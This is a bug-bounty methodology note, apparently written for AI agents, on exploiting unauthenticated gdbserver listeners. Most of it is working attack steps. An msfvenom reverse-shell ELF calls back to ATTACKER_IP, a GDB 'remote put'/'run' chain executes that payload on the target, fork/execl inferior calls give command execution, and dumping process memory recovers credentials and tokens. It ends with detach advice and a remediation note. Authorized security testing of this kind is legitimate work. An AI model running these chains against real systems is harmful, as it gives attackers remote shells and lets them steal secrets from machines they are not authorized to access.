---
technology: "gdbserver (GNU remote debug server)"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
version: 1.0 (upstream-only new unit)
source: "rewritten from HackTricks (src/network-services-pentesting/pentesting-remote-gdbserver.md), CC BY-NC 4.0, accessed 2026-11-13"
status: upstream-only
provenance: "upstream-only: zero corpus evidence by design — methodology built from the upstream reference and primary sources. Verified 2026-11-13 against the GNU GDB manual: Server.html (no built-in security; connection = target access with gdbserver's account privileges; comm host:port with host ignored; --attach/--multi/--once; extended-remote persistence; monitor exit), Connecting.html (run supported only in extended-remote and selects 'set remote exec-file'; attach only in extended-remote; --multi defers program choice), File-Transfer.html (remote put/get/delete; not all targets support them). msfvenom flags grounded against the tools vault msfvenom note (PrependFork=True forks a child before the callback; -f elf output). Inferior-call variant described from the reference's public gdb-Python-command approach (fork/execl through GDB call) without reproducing the script wholesale. No CVE, no metasploit module claimed. Companion overview: [[gdbserver|gdbserver]]."
---

# gdbserver bug bounty methodology

Target model: a gdbserver listener on an operator-chosen TCP port, typically on a dev box, embedded target, or CI runner. End state: arbitrary process execution with the privileges of the account running gdbserver. There is nothing to brute force and nothing to bypass — identification is the only real phase. Caution: gdbserver is attached to live processes; kill/detach decisions on a production target are impact decisions.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Listener identification | reachability | yes | protocol confirmation (`+`/`$` framing) — recon |
| Memory/register access via GDB | none | yes | secret recovery from the inferior — High |
| `remote put` + `run` chain | extended-remote (or --multi); target file-I/O support for put | yes | arbitrary process execution — Critical |
| Inferior-call execution (fork/execl) | extended-remote, live inferior, libc symbols loaded | yes | command execution — Critical |
| `--attach` to a root inferior | gdbserver already attached as root | yes | root — Critical |

## Phase 1 — identify the listener

```bash
# bare connect: gdbserver waits passively; a silent open port with no banner is typical.
# confirm by attaching a real GDB:
gdb -q -nx -ex 'target remote TARGET_IP:2345' -ex 'info registers' -ex quit
```

The remote protocol answers with `+` acknowledgments and `$packet#checksum` frames (`info registers` returning a register dump is conclusive). Expect no nmap service label — the port number is whatever a developer chose (the manual's examples use 2345; treat any unexplained listener on a dev segment as a candidate).

## Phase 2 — the upload-and-run chain (extended-remote)

Works when the server accepts `target extended-remote` and can start a program; `remote put` additionally requires the target's remote file-I/O support. Build a standalone ELF, transfer it, point the server at it, run:

```bash
# 1. payload: forked child survives the debugged process being killed on disconnect
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 PrependFork=true -f elf -o shell.elf
chmod +x shell.elf

# 2. on your host:
gdb -q shell.elf
(gdb) target extended-remote TARGET_IP:2345
(gdb) remote put shell.elf /tmp/shell.elf
(gdb) set remote exec-file /tmp/shell.elf
(gdb) run
# the ELF executes on the target with gdbserver's privileges; your listener catches it
```

Decision points: if `remote put` errors (unsupported on that target), write the payload with inferior calls instead (phase 3) or reuse a binary already on the box (`set remote exec-file /bin/bash` style) — the chain needs upload only if no suitable binary exists. Match architecture and libc (a target-built `file` on your side is unnecessary — symbols are optional; an executable to run is not).

## Phase 3 — execute through a live inferior (no file transfer)

When the server debugs a running process, GDB's function-call capability executes code inside it: resolve symbols (`fork`, `execl`, `open`, `write`, `lseek`, `read`, `close`, `malloc`, `free` after libc loads — run to a `main` breakpoint first), then drive the classic sequence through `call`:

```bash
gdb -q -nx
(gdb) target extended-remote TARGET_IP:2345
(gdb) set remote exec-file /bin/bash     # a known-good inferior, if restart is allowed
(gdb) break main
(gdb) run
(gdb) call (int)fork()
(gdb) ...                                  # in the child: execl("/bin/sh","sh","-c","COMMAND > /tmp/out 2>&1",0)
(gdb) ...                                  # then open/lseek/read the output file and printf it back
```

The reference implementation is a public gdb Python command (`rcmd`) that wraps the whole fork→`execl`→read-output dance behind one invocation; reproduce that flow rather than inventing packet surgery. Preconditions: a usable `/bin/sh`, permission to fork/exec, and symbols for the called functions — a stripped static binary makes `info address` fail, and with it this path.

## Phase 4 — memory-only operations (when starting processes is too loud)

Before any execution: dump process memory and the environment. `x/s` on candidate pointers, `info proc mappings` equivalents via the remote protocol, and searching writable segments for keys, tokens, and credentials in the inferior's heap. On a database or auth service under debug, this alone is a critical finding with zero process churn.

## Phase 5 — close out safely

```text
(gdb) detach            # leave the inferior running — the polite exit
(gdb) monitor exit      # terminate gdbserver itself (extended-remote only)
```

Only you can judge whether killing the debugged process is acceptable; default to `detach`. Report the listener (port, owning account, inferior process) — the fix is bind-to-loopback/SSH-tunnel plus never shipping debug listeners to shared networks.

## Tool mapping (in prose)

GDB itself is the client (target remote / extended-remote, remote put, set remote exec-file, call, detach, monitor exit); msfvenom produces the standalone ELF (`-f elf`, `PrependFork=true` to survive process kill); netcat plus the usual listeners catch callbacks. No metasploit module is verified for this surface — the chain is manual by nature. Bug classes: CWE-306 (no authentication on a process-control service), CWE-668 (resource exposure — debug listeners on routable networks), CWE-732 (gdbserver running as a privileged account).
